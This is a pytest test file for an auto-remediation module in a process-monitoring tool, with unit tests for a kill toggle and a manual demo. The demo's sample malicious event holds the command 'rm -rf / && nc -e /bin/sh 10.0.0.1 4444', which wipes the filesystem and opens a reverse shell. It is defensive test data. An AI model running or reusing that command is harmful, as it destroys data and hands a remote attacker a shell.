"""
Tests for Phase 7: Auto-Remediation
=====================================
Tests the remediation module's ability to detect, skip, and kill processes.

HOW TO RUN MANUALLY (Step-by-step demo):
-----------------------------------------

Step 1 — Start the backend (in a NEW terminal):
    conda activate aibouncer
    cd C:\\Users\\raphe\\Webdev\\Projects\\kernal_ai_bouncer
    uvicorn backend.app:app --host 0.0.0.0 --port 8000 --reload --reload-dir backend

Step 2 — Open the Dashboard:
    http://localhost:5173
    Scroll down to the "Auto-Remediation" toggle and ENABLE it (it turns red).

Step 3 — Start a dummy long-running process to kill (in ANOTHER new terminal):
    python -c "import time; print('Victim PID:', __import__('os').getpid()); time.sleep(9999)"
    Note the PID printed (e.g. 12345).

Step 4 — Submit a malicious event with that PID (in a THIRD terminal):
    $pid = 12345  # replace with the actual PID
    Invoke-RestMethod -Uri "http://localhost:8000/agent/events" `
        -Method POST `
        -Headers @{"Content-Type"="application/json"} `
        -Body "{\"command\":\"rm -rf / && nc -e /bin/sh 10.0.0.1 4444\",\"pid\":$pid}"

Step 5 — Expected results:
    ✅ The dummy python process in Step 3 should TERMINATE instantly.
    ✅ The Dashboard event table shows a purple "🛑 Killed" badge on that event.
    ✅ The backend terminal prints: "🛑 Remediation: Process 'python' (PID XXXX) terminated"
    ✅ Your Discord/Slack webhook fires with the malicious event details.
"""

import os
import sys
import time
import subprocess
import pytest

# Add project root to sys.path
PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

from backend.agent.remediation import (
    kill_process,
    is_remediation_enabled,
    set_remediation_enabled,
)


# ==============================================================================
# Unit Tests
# ==============================================================================

class TestRemediationToggle:
    """Test the global enable/disable toggle."""

    def test_disabled_by_default(self):
        """Remediation should be OFF by default for safety."""
        set_remediation_enabled(False)
        assert is_remediation_enabled() is False

    def test_enable_toggle(self):
        """Toggle should switch to True."""
        set_remediation_enabled(True)
        assert is_remediation_enabled() is True

    def test_disable_toggle(self):
        """Toggle should switch back to False."""
        set_remediation_enabled(True)
        set_remediation_enabled(False)
        assert is_remediation_enabled() is False


class TestKillProcessEdgeCases:
    """Test kill_process() handles bad inputs gracefully."""

    def test_skip_when_pid_is_zero(self):
        """PID 0 means the event came from the API (no real process). Skip gracefully."""
        result = kill_process(0)
        assert result["status"] == "skipped_no_pid"
        assert result["action"] == "kill_process"

    def test_already_dead_process(self):
        """Killing a non-existent PID should return 'already_dead', not crash."""
        result = kill_process(99999999)  # Very unlikely to exist
        assert result["status"] in ("already_dead", "failed")
        assert result["action"] == "kill_process"

    def test_returns_dict_with_expected_keys(self):
        """Result dict must always have 'action', 'status', 'detail'."""
        result = kill_process(0)
        assert "action" in result
        assert "status" in result
        assert "detail" in result


class TestKillRealProcess:
    """Integration test: spawn a real subprocess and kill it."""

    def test_kill_live_process(self):
        """
        Spawn a real sleeping process, then kill it via kill_process().
        Verifies the function returns 'success' and the process is actually gone.
        """
        # Spawn a long-running dummy process
        proc = subprocess.Popen(
            [sys.executable, "-c", "import time; time.sleep(999)"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        pid = proc.pid

        # Give it a moment to fully start
        time.sleep(0.2)

        # Kill it via our remediation module
        result = kill_process(pid)

        # Verify it worked
        assert result["action"] == "kill_process"
        assert result["status"] == "success", f"Expected success, got: {result}"

        # Verify the process is actually dead (poll() returns non-None if terminated)
        time.sleep(0.3)
        assert proc.poll() is not None, "Process should be terminated but is still running"
